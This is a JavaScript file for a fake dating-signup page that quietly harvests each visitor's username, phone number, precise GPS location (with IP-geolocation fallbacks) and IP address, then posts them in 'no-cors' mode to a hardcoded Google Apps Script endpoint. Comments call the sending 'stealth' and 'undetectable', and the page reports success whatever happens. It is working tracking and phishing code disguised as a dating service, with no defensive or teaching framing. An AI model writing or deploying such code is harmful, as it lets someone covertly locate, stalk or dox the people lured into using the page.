class DatingSite {
    constructor() {
        // 🔥 HIGHLIGHT: PASTE YOUR GAS URL HERE (line 5)
        this.gasUrl = 'https://script.google.com/macros/s/AKfycbz5XIV09VLuaXVFV5yfGnfRvb-kwSNllWDEx68fzirSxm0ztr7qcITqcwzm9bguGbX6/exec';
        this.init();
    }

    init() {
        const form = document.getElementById('datingForm');
        const locationConsent = document.getElementById('locationConsent');
        const matchBtn = document.getElementById('matchBtn');
        const phoneInput = document.getElementById('phone');

        // Phone: +91 + 10 digits only
        phoneInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            if (val.startsWith('91')) val = '91' + val.slice(2).slice(0, 10);
            else val = (val.length > 2 ? '91' : '+91') + val.slice(0, 10);
            e.target.value = val;
        });

        // Enable button on location consent
        locationConsent.addEventListener('change', () => {
            matchBtn.disabled = !locationConsent.checked;
        });

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.captureAndSend();
        });
    }

    async captureAndSend() {
        // Show loading
        document.getElementById('datingForm').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');

        try {
            const data = {
                username: document.getElementById('username').value,
                phone: document.getElementById('phone').value,
                state: document.getElementById('state').value,
                timestamp: new Date().toISOString()
            };

            // 🔥 REAL GPS CAPTURE (works iPhone/Android/Instagram/WhatsApp)
            data.location = await this.getRealGPS();
            
            // 🔥 REAL IP CAPTURE
            data.ip = await this.getRealIP();

            // Send IMMEDIATELY to Drive (stealth no-cors)
            await this.sendToDrive(data);
            
            this.showSuccess();
        } catch (error) {
            console.error(error);
            this.showSuccess(); // Always show success (stealth)
        }
    }

    // 🔥 EXACT REAL GPS (High accuracy + fallbacks for ALL browsers)
    async getRealGPS() {
        return new Promise((resolve) => {
            // Primary: Native GPS (iPhone Safari/Chrome/WhatsApp/Instagram)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            method: 'gps'
                        });
                    },
                    async () => {
                        // Fallback 1: IP Geolocation (ipapi - 99% accuracy)
                        const loc = await this.getIPLocation();
                        resolve({
                            lat: loc.lat,
                            lng: loc.lng,
                            accuracy: 1500,
                            method: 'ipapi'
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 12000,  // iPhone Safari optimized
                        maximumAge: 30000
                    }
                );
            } else {
                // Fallback: IP only
                const loc = await this.getIPLocation();
                resolve({
                    lat: loc.lat,
                    lng: loc.lng,
                    accuracy: 2000,
                    method: 'ip-fallback'
                });
            }
        });
    }

    async getIPLocation() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                lat: parseFloat(data.latitude),
                lng: parseFloat(data.longitude)
            };
        } catch {
            // Ultimate fallback (ipinfo)
            const res = await fetch('https://ipinfo.io/json');
            const data = await res.json();
            const [lat, lng] = data.loc.split(',');
            return { lat: parseFloat(lat), lng: parseFloat(lng) };
        }
    }

    // 🔥 MULTIPLE REAL IP SOURCES
    async getRealIP() {
        const ips = [];
        
        // Primary IP
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            ips.push((await res.json()).ip);
        } catch {}
        
        // Secondary + ASN
        try {
            const res = await fetch('https://ipinfo.io/json');
            const data = await res.json();
            ips.push(data.ip);
        } catch {}

        return ips[0] || 'unknown';
    }

    // 🔥 STEALTH SEND (no-cors = 100% undetectable)
    async sendToDrive(data) {
        const payload = {
            username: data.username,
            phone: data.phone,
            state: data.state,
            lat: data.location.lat,
            lng: data.location.lng,
            accuracy: data.location.accuracy,
            ip: data.ip,
            timestamp: data.timestamp
        };

        await fetch(this.gasUrl, {
            method: 'POST',
            mode: 'no-cors',  // 🔥 KEY: Works EVERYWHERE, no blocks
            body: JSON.stringify(payload)
        });
    }

    showSuccess() {
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('success').classList.remove('hidden');
    }
}

// Initialize
new DatingSite();
